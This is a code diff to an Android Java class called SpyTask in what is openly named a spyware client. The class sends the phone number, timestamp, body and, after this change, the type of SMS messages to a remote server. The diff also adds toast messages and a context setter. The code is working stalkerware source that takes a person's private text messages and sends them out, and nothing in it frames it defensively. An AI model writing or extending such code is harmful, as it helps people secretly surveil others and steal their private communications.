@@ -6,8 +6,10 @@ import java.util.Map;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import android.content.Context;
 import android.os.AsyncTask;
 import android.util.Log;
+import android.widget.Toast;
 
 import com.android.volley.AuthFailureError;
 import com.android.volley.DefaultRetryPolicy;
@@ -20,6 +22,8 @@ import com.android.volley.toolbox.StringRequest;
 import com.hoangdv.spywareclient.AppController;
 
 public class SpyTask extends AsyncTask<SmsInfo, Void, Void> {
+
+	private Context context;
 
 	@Override
 	protected Void doInBackground(SmsInfo... params) {
@@ -40,12 +44,16 @@ public class SpyTask extends AsyncTask<SmsInfo, Void, Void> {
 								e.printStackTrace();
 							}
 							Log.d("send2server", arg0);
+							Toast.makeText(context, "Success: "+arg0.toString(),
+									Toast.LENGTH_SHORT).show();
 						}
 					}, new ErrorListener() {
 						@Override
 						public void onErrorResponse(VolleyError arg0) {
 							// TODO Auto-generated method stub
 							Log.e("send2server", arg0.toString());
+							Toast.makeText(context, arg0.toString(),
+									Toast.LENGTH_SHORT).show();
 						}
 					}) {
 				@Override
@@ -56,6 +64,7 @@ public class SpyTask extends AsyncTask<SmsInfo, Void, Void> {
 					map.put("sPhoneNumber", smsInfo.getPhoneNumber());
 					map.put("tTime", smsInfo.getTimeStamp());
 					map.put("sBody", smsInfo.getBodySms());
+					map.put("bType", smsInfo.getbType());
 					return map;
 				}
 			};
@@ -70,6 +79,14 @@ public class SpyTask extends AsyncTask<SmsInfo, Void, Void> {
 		}
 
 		return null;
+	}
+
+	public Context getContext() {
+		return context;
+	}
+
+	public void setContext(Context context) {
+		this.context = context;
 	}
 
 }
